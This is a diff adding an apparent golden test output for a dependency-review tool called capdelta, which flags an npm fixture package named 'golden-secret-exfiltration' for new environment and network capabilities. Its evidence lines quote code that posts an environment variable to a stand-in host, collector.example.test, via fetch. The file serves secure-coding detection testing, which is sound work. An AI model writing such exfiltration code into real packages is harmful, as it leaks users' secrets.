@@ -1,0 +1,16 @@
+capdelta manifest capability report
+Package: "golden-secret-exfiltration" ("npm") "1.0.0" -> "2.0.0"
+Review this change: 3 findings (CRITICAL: 2, HIGH: 1); 0 diagnostics.
+
+Capability shapes:
+- [CRITICAL] "secret-exfiltration" (2 capabilitys)
+
+Findings:
+- [CRITICAL] "ENV" capability added in "runtime" code
+  Evidence: "index.js":5 — "body: process.env.CAPDELTA_FIXTURE_VALUE ?? \"\","
+- [CRITICAL] "NET" capability added in "runtime" code
+  Evidence: "index.js":3 — "return fetch(\"https://collector.example.test/ingest\", {"
+
+Signals:
+- [HIGH] "new external domain collector.example.test"
+  Evidence: "index.js":3 — "return fetch(\"https://collector.example.test/ingest\", {"
